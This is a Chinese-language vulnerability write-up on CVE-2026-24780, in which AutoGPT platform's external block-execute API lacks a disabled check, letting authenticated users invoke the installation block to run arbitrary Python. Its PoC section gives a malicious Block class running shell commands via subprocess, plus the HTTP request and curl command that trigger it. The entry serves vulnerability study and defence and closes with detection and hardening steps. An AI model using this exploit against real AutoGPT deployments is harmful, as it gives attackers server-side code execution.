---
id: ai-security-agent-security-autogpt-disabled-block-install-rce
title: AutoGPT 禁用块未校验 disabled：硬编码 UUID 调用 BlockInstallationBlock 执行任意 Python（CVE-2026-24780）
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: autogpt-disabled-block-install-rce
aliases:
- CVE-2026-24780
- AutoGPT RCE
- BlockInstallationBlock
- 禁用 Block 绕过
- AutoGPT block execute
- 硬编码 UUID 绕过 disabled
tags:
- ai-security
- agent
- autogpt
- rce
- python
- disabled-check
- uuid
- api
- cve-2026-24780
cve:
- CVE-2026-24780
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T10:16:40+08:00'
  notes: 已对照原文与全部 3 张图核对：BlockInstallationBlock 硬编码 id 45e78db5-03e9-447f-9395-308d712f5f08、disabled=True、run 写 backend/blocks/<uuid>.py 后 import/getattr/实例化；内部 features/v1.py 有 disabled 检查；修复版 external/v1/routes.py 增加 EXECUTE_BLOCK 权限与 disabled 检查，反证外部执行端点原缺失校验。PoC 未实际请求目标；原文未给受影响版本区间，未设置 versions
---

## 一句话结论

AutoGPT platform 的外部 API `/api/blocks/{block_id}/execute` 只按 UUID 取出 Block 并执行，未校验 `disabled` 属性；内置的 `BlockInstallationBlock` 本应被禁用（`disabled=True`）且 UUID 硬编码为 `45e78db5-03e9-447f-9395-308d712f5f08`，但它会把请求中的 Python 代码写入文件后 import 并实例化，因此任何具备执行权限的已认证用户都能调用该禁用块，在服务端执行任意 Python 代码（CVE-2026-24780）。

## 原理

- **Block 机制**：AutoGPT platform 用 Block 表示可复用的智能体工作流组件，每个 Block 是一个 Python 类，声明输入/输出 schema 并实现 `run()`。Block 有 `id`、`disabled` 等属性，禁用块不应被用户执行。
- **危险的安装块**：`BlockInstallationBlock` 的 `__init__` 把 `id` 硬编码为 `45e78db5-03e9-447f-9395-308d712f5f08`，并设置 `disabled=True`。它的 `run(input_data)` 从 `input_data.code` 取用户提交的源码：
  1. 正则提取 `class Xxx(Block):` 的类名和 `id="..."` 的 UUID；
  2. 把代码写入 `backend/blocks/<uuid>.py`；
  3. `__import__(module_name, fromlist=[class_name])` 导入模块；
  4. `getattr(module, class_name)` 取类并实例化 `block_class()`；
  5. 调用 `execute_block_test(block)` 执行测试。
  实例化会触发类 `__init__`，因此提交的代码在导入/实例化阶段就会执行。
- **缺失的 disabled 校验**：外部 API 路由（`backend/api/external/v1/routes.py`）的 `execute_graph_block` 只做认证/API Key 权限检查，取出 block 后直接 `async for name, data in obj.execute(data)`；它没有像内部 API 的同一端点那样检查 `obj.disabled`。列表接口虽然过滤了 `disabled`，但执行接口没有，形成“列表看不到、按 UUID 仍可执行”的不一致。
- **硬编码 UUID 让绕过可预测**：即使不知道块列表，UUID 是源码中固定值，攻击者可直接构造 URL；`disabled=True` 只是展示层/列表层过滤，不是执行层的访问控制。
- **最终危害**：提交的 Python 代码以服务端进程权限运行，可直接 `subprocess`、读写文件、访问内部网络与凭据，属于完整 RCE。

## 触发条件

- 目标运行存在该缺陷的 AutoGPT platform 版本，外部 API `/api/blocks/{block_id}/execute` 可达。
- 攻击者能注册账号或持有可用 session/API Key，并具备执行 Block 的权限（`APIKeyPermission.EXECUTE_BLOCK`）。
- `BlockInstallationBlock` 仍注册在块表中（即使 `disabled=True`），且其 UUID 未被修改。
- 服务端进程对 `backend/blocks/` 目录可写（安装块本身需要写文件）。

## 利用步骤

1. 注册/登录 AutoGPT platform，获取 session cookie 或带 `EXECUTE_BLOCK` 权限的 API Key。
2. 构造恶意 Block 源码：类继承 `Block`，在 `__init__`（或 `run`）中放置任意 Python 代码；提供一个唯一 `id` 供安装块提取文件名。
3. 向 `/api/blocks/45e78db5-03e9-447f-9395-308d712f5f08/execute` 发送 POST，JSON body 为 `{"code": "<恶意源码>"}`，携带认证信息。
4. 服务端把源码写入 `backend/blocks/<uuid>.py` 并 import/实例化；`__init__` 中的代码立即执行。
5. 通过命令回显、写入文件或外带通道验证执行结果；清理/删除落地文件（安装失败时服务端会 `os.remove`，成功时保留）。

## PoC

```python
# 恶意 Block：__init__ 在安装/实例化阶段执行任意代码
import subprocess
from backend.data.block import Block, BlockOutput, BlockSchemaInput, BlockSchemaOutput
from backend.data.model import SchemaField

class RCEBlock(Block):
    class Input(BlockSchemaInput):
        cmd: str = SchemaField(description="Command")

    class Output(BlockSchemaOutput):
        result: str = SchemaField(description="Result")

    def __init__(self):
        # 任意代码在 super().__init__ 之前执行
        with open("/tmp/pwned", "w") as fp:
            fp.write("success")
        super().__init__(
            id="aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
            description="RCE",
            input_schema=self.Input,
            output_schema=self.Output,
        )

    async def run(self, input_data, **kwargs):
        result = subprocess.check_output(input_data.cmd, shell=True).decode()
        yield "result", result
```

```http
POST /api/blocks/45e78db5-03e9-447f-9395-308d712f5f08/execute HTTP/1.1
Host: target
Cookie: session=<session>
Content-Type: application/json

{"code": "<上面的 RCEBlock 源码>"}
```

等价 curl：

```bash
curl -X POST "https://target/api/blocks/45e78db5-03e9-447f-9395-308d712f5f08/execute" \
  -H "Cookie: session=<session>" \
  -H "Content-Type: application/json" \
  -d '{"code": "<PAYLOAD>"}'
```

## 变体与关联

- 同类缺陷不限于安装块：任何 `disabled=True` 但含代码执行/命令执行/文件写入能力的 Block，只要执行端点不复查 `disabled`，都可能被按 UUID 调用；应审计所有禁用块的可达性。
- 内部 API 与外部 API 的校验不一致是常见根因：内部端点已有 `if obj.disabled: 403`，外部端点缺失；修复应把 disabled 校验下沉到统一执行入口，而非各路由重复。
- 关联：[[ai-security-agent-security-langflow-build-public-tmp-data-code-exec]]、[[ai-security-agent-security-letta-tools-run-unauth-code-exec]]（同类 Agent 平台代码执行入口）；[[ai-security-agent-security-hitl-capability-dangerous-tool-guard]]（危险工具应在框架层做确定性门禁，而不是靠禁用标记或提示词）。

## 检测与防御

- 在执行 Block 的统一入口强制校验 `disabled`（不能只在列表接口过滤），并校验调用者是否有该 Block 的权限；不要依赖硬编码 UUID 的保密性。
- 外部 API 端点补充 `APIKeyPermission.EXECUTE_BLOCK` 等权限校验；对安装/代码执行类 Block 做管理员专属授权或直接移除。
- 升级到修复版本；审计 `backend/blocks/` 下的新增文件、`__import__`/`exec`/`subprocess` 调用与异常堆栈。
- 监控 `/api/blocks/*/execute` 对禁用块 UUID 的请求、普通用户调用安装块、以及短时间内的新块文件写入；对服务端出站与命令执行行为告警。
- 最小权限运行 AutoGPT 后端，限制其对源码目录的写权限与对内部网络的访问。
